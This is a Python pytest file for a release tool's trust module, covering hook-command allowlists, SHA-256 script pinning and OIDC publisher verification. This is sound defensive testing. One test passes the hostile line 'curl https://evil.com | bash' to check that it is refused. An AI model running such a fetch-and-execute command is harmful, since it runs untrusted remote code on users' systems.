# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Tests for plugin trust verification.

Validates the hook allowlist, script pinning, and publisher trust
logic in :mod:`releasekit.trust`.

Key Concepts::

    ┌─────────────────────┬────────────────────────────────────────────────┐
    │ Concept             │ What We Test                                   │
    ├─────────────────────┼────────────────────────────────────────────────┤
    │ Hook allowlist      │ Allowed executables pass, others are refused  │
    ├─────────────────────┼────────────────────────────────────────────────┤
    │ Script pinning      │ SHA-256 match passes, mismatch is refused     │
    ├─────────────────────┼────────────────────────────────────────────────┤
    │ Strict mode         │ strict_hooks=True refuses unpinned scripts    │
    ├─────────────────────┼────────────────────────────────────────────────┤
    │ Publisher trust     │ Trusted OIDC identity passes, others refused  │
    └─────────────────────┴────────────────────────────────────────────────┘

Data Flow::

    test → create TrustConfig → call verify_* → assert TrustResult
"""

from __future__ import annotations

import hashlib
from pathlib import Path

import pytest
from releasekit.trust import (
    DEFAULT_HOOK_ALLOWLIST,
    TrustConfig,
    TrustResult,
    compute_script_digest,
    verify_hook_command,
    verify_hook_script,
    verify_publisher,
)


class TestVerifyHookCommand:
    """Tests for hook command allowlist verification."""

    def test_allowed_command(self) -> None:
        """Command with allowed executable passes."""
        cfg = TrustConfig()
        result = verify_hook_command('uv run pytest', cfg)
        assert result.allowed

    def test_allowed_command_with_path(self) -> None:
        """Command with full path to allowed executable passes."""
        cfg = TrustConfig()
        result = verify_hook_command('/usr/bin/uv run pytest', cfg)
        assert result.allowed

    def test_disallowed_command_strict(self) -> None:
        """Disallowed command in strict mode is refused."""
        cfg = TrustConfig(strict_hooks=True)
        result = verify_hook_command('curl https://evil.com | bash', cfg)
        assert not result.allowed
        assert result.hint

    def test_disallowed_command_non_strict(self) -> None:
        """Disallowed command in non-strict mode is allowed with warning."""
        cfg = TrustConfig(strict_hooks=False)
        result = verify_hook_command('curl https://example.com', cfg)
        assert result.allowed
        assert 'not in allowlist' in result.reason

    def test_empty_command(self) -> None:
        """Empty command is refused."""
        cfg = TrustConfig()
        result = verify_hook_command('', cfg)
        assert not result.allowed

    def test_whitespace_command(self) -> None:
        """Whitespace-only command is refused."""
        cfg = TrustConfig()
        result = verify_hook_command('   ', cfg)
        assert not result.allowed

    def test_custom_allowlist(self) -> None:
        """Custom allowlist is respected."""
        cfg = TrustConfig(hook_allowlist=frozenset({'python', 'make'}))
        assert verify_hook_command('python -m pytest', cfg).allowed
        assert verify_hook_command('make build', cfg).allowed
        assert not verify_hook_command('uv run test', cfg).allowed

    def test_all_default_executables_allowed(self) -> None:
        """All default allowlist executables pass."""
        cfg = TrustConfig()
        for exe in DEFAULT_HOOK_ALLOWLIST:
            result = verify_hook_command(f'{exe} --version', cfg)
            assert result.allowed, f'{exe} should be allowed'

    def test_pnpm_allowed(self) -> None:
        """Pnpm is in the default allowlist."""
        cfg = TrustConfig()
        result = verify_hook_command('pnpm run build', cfg)
        assert result.allowed

    def test_bazel_allowed(self) -> None:
        """Bazel is in the default allowlist."""
        cfg = TrustConfig()
        result = verify_hook_command('bazel build //...', cfg)
        assert result.allowed


class TestVerifyHookScript:
    """Tests for hook script SHA-256 pinning verification."""

    def test_pinned_script_matches(self, tmp_path: Path) -> None:
        """Script with matching SHA-256 passes."""
        script = tmp_path / 'hook.sh'
        script.write_text('#!/bin/bash\necho hello\n')
        digest = hashlib.sha256(script.read_bytes()).hexdigest()

        cfg = TrustConfig(pinned_scripts={str(script): digest})
        result = verify_hook_script(script, cfg)
        assert result.allowed

    def test_pinned_script_mismatch(self, tmp_path: Path) -> None:
        """Script with wrong SHA-256 is refused."""
        script = tmp_path / 'hook.sh'
        script.write_text('#!/bin/bash\necho hello\n')

        cfg = TrustConfig(pinned_scripts={str(script): 'wrong_digest'})
        result = verify_hook_script(script, cfg)
        assert not result.allowed
        assert 'mismatch' in result.reason.lower()

    def test_unpinned_script_strict(self, tmp_path: Path) -> None:
        """Unpinned script in strict mode is refused."""
        script = tmp_path / 'hook.sh'
        script.write_text('#!/bin/bash\necho hello\n')

        cfg = TrustConfig(strict_hooks=True)
        result = verify_hook_script(script, cfg)
        assert not result.allowed
        assert 'not pinned' in result.reason.lower()

    def test_unpinned_script_non_strict(self, tmp_path: Path) -> None:
        """Unpinned script in non-strict mode is allowed."""
        script = tmp_path / 'hook.sh'
        script.write_text('#!/bin/bash\necho hello\n')

        cfg = TrustConfig(strict_hooks=False)
        result = verify_hook_script(script, cfg)
        assert result.allowed

    def test_missing_script(self, tmp_path: Path) -> None:
        """Missing script file is refused."""
        cfg = TrustConfig()
        result = verify_hook_script(tmp_path / 'nonexistent.sh', cfg)
        assert not result.allowed
        assert 'not found' in result.reason.lower()


class TestVerifyPublisher:
    """Tests for backend publisher trust verification."""

    def test_trusted_publisher(self) -> None:
        """Publisher in trusted_publishers passes."""
        cfg = TrustConfig(
            trusted_publishers={
                'https://token.actions.githubusercontent.com': ['firebase/genkit'],
            },
        )
        result = verify_publisher(
            'releasekit-backend-go',
            'https://token.actions.githubusercontent.com',
            'firebase/genkit',
            cfg,
        )
        assert result.allowed

    def test_untrusted_publisher(self) -> None:
        """Publisher not in trusted_publishers is refused."""
        cfg = TrustConfig(
            trusted_publishers={
                'https://token.actions.githubusercontent.com': ['firebase/genkit'],
            },
        )
        result = verify_publisher(
            'evil-backend',
            'https://token.actions.githubusercontent.com',
            'evil/repo',
            cfg,
        )
        assert not result.allowed
        assert result.hint

    def test_untrusted_issuer(self) -> None:
        """Publisher with unknown issuer is refused."""
        cfg = TrustConfig(
            trusted_publishers={
                'https://token.actions.githubusercontent.com': ['firebase/genkit'],
            },
        )
        result = verify_publisher(
            'some-backend',
            'https://unknown-issuer.example.com',
            'firebase/genkit',
            cfg,
        )
        assert not result.allowed

    def test_verification_disabled(self) -> None:
        """Plugin verification disabled allows everything."""
        cfg = TrustConfig(plugin_verification=False)
        result = verify_publisher(
            'any-package',
            'any-issuer',
            'any-subject',
            cfg,
        )
        assert result.allowed
        assert 'disabled' in result.reason.lower()


class TestComputeScriptDigest:
    """Tests for the script digest utility."""

    def test_compute_digest(self, tmp_path: Path) -> None:
        """Compute SHA-256 digest of a script."""
        script = tmp_path / 'test.sh'
        content = b'#!/bin/bash\necho test\n'
        script.write_bytes(content)

        expected = hashlib.sha256(content).hexdigest()
        assert compute_script_digest(script) == expected

    def test_missing_file_raises(self, tmp_path: Path) -> None:
        """Missing file raises FileNotFoundError."""
        with pytest.raises(FileNotFoundError):
            compute_script_digest(tmp_path / 'nonexistent.sh')


class TestVerifyHookCommandEdgeCases:
    """Additional edge-case tests for hook command verification."""

    def test_invalid_shell_syntax(self) -> None:
        """Invalid shell syntax is refused."""
        cfg = TrustConfig()
        result = verify_hook_command("uv run 'unclosed quote", cfg)
        assert not result.allowed
        assert 'parse' in result.reason.lower()

    def test_executable_with_subdirectory_path(self) -> None:
        """Executable with subdirectory path extracts basename."""
        cfg = TrustConfig()
        result = verify_hook_command('./node_modules/.bin/pnpm run build', cfg)
        assert result.allowed  # pnpm is in allowlist.

    def test_quoted_executable(self) -> None:
        """Quoted executable is parsed correctly."""
        cfg = TrustConfig()
        result = verify_hook_command('"uv" run pytest', cfg)
        assert result.allowed

    def test_dart_allowed(self) -> None:
        """Dart is in the default allowlist."""
        cfg = TrustConfig()
        result = verify_hook_command('dart pub publish', cfg)
        assert result.allowed

    def test_gradle_allowed(self) -> None:
        """Gradle is in the default allowlist."""
        cfg = TrustConfig()
        result = verify_hook_command('gradle build', cfg)
        assert result.allowed

    def test_mvn_allowed(self) -> None:
        """Mvn is in the default allowlist."""
        cfg = TrustConfig()
        result = verify_hook_command('mvn deploy', cfg)
        assert result.allowed


class TestVerifyHookScriptEdgeCases:
    """Additional edge-case tests for hook script verification."""

    def test_binary_script_pinning(self, tmp_path: Path) -> None:
        """Binary script content is pinned correctly."""
        script = tmp_path / 'hook.bin'
        script.write_bytes(b'\x00\x01\x02\x03')
        digest = hashlib.sha256(b'\x00\x01\x02\x03').hexdigest()

        cfg = TrustConfig(pinned_scripts={str(script): digest})
        result = verify_hook_script(script, cfg)
        assert result.allowed

    def test_symlink_script(self, tmp_path: Path) -> None:
        """Symlinked script resolves and is checked."""
        real_script = tmp_path / 'real.sh'
        real_script.write_text('#!/bin/bash\necho real\n')
        link = tmp_path / 'link.sh'
        link.symlink_to(real_script)

        digest = hashlib.sha256(real_script.read_bytes()).hexdigest()
        cfg = TrustConfig(pinned_scripts={str(link): digest})
        result = verify_hook_script(link, cfg)
        assert result.allowed


class TestVerifyPublisherEdgeCases:
    """Additional edge-case tests for publisher verification."""

    def test_multiple_subjects_per_issuer(self) -> None:
        """Multiple subjects for one issuer are all trusted."""
        cfg = TrustConfig(
            trusted_publishers={
                'https://token.actions.githubusercontent.com': [
                    'firebase/genkit',
                    'firebase/other-repo',
                ],
            },
        )
        r1 = verify_publisher(
            'pkg-a',
            'https://token.actions.githubusercontent.com',
            'firebase/genkit',
            cfg,
        )
        r2 = verify_publisher(
            'pkg-b',
            'https://token.actions.githubusercontent.com',
            'firebase/other-repo',
            cfg,
        )
        assert r1.allowed
        assert r2.allowed

    def test_empty_trusted_publishers(self) -> None:
        """Empty trusted_publishers refuses all."""
        cfg = TrustConfig(trusted_publishers={})
        result = verify_publisher(
            'any-pkg',
            'https://issuer.example.com',
            'any-subject',
            cfg,
        )
        assert not result.allowed


class TestTrustConfig:
    """Tests for TrustConfig defaults."""

    def test_default_allowlist(self) -> None:
        """Default allowlist contains expected executables."""
        cfg = TrustConfig()
        assert 'uv' in cfg.hook_allowlist
        assert 'pnpm' in cfg.hook_allowlist
        assert 'bazel' in cfg.hook_allowlist
        assert 'go' in cfg.hook_allowlist
        assert 'cargo' in cfg.hook_allowlist

    def test_default_strict_hooks(self) -> None:
        """strict_hooks defaults to True."""
        cfg = TrustConfig()
        assert cfg.strict_hooks

    def test_default_plugin_verification(self) -> None:
        """plugin_verification defaults to True."""
        cfg = TrustConfig()
        assert cfg.plugin_verification

    def test_default_pinned_scripts_empty(self) -> None:
        """pinned_scripts defaults to empty dict."""
        cfg = TrustConfig()
        assert cfg.pinned_scripts == {}

    def test_default_trusted_publishers_empty(self) -> None:
        """trusted_publishers defaults to empty dict."""
        cfg = TrustConfig()
        assert cfg.trusted_publishers == {}

    def test_frozen(self) -> None:
        """TrustConfig is frozen."""
        cfg = TrustConfig()
        with pytest.raises(AttributeError):
            cfg.strict_hooks = False  # type: ignore[misc]


class TestTrustResult:
    """Tests for the TrustResult dataclass."""

    def test_allowed_result(self) -> None:
        """Allowed result has correct fields."""
        r = TrustResult(allowed=True, subject='test', reason='OK')
        assert r.allowed
        assert r.subject == 'test'
        assert r.hint == ''

    def test_refused_result_with_hint(self) -> None:
        """Refused result carries hint."""
        r = TrustResult(
            allowed=False,
            subject='evil',
            reason='Not trusted',
            hint='Add to allowlist',
        )
        assert not r.allowed
        assert r.hint == 'Add to allowlist'

    def test_frozen(self) -> None:
        """TrustResult is frozen."""
        r = TrustResult(allowed=True, subject='test')
        with pytest.raises(AttributeError):
            r.allowed = False  # type: ignore[misc]
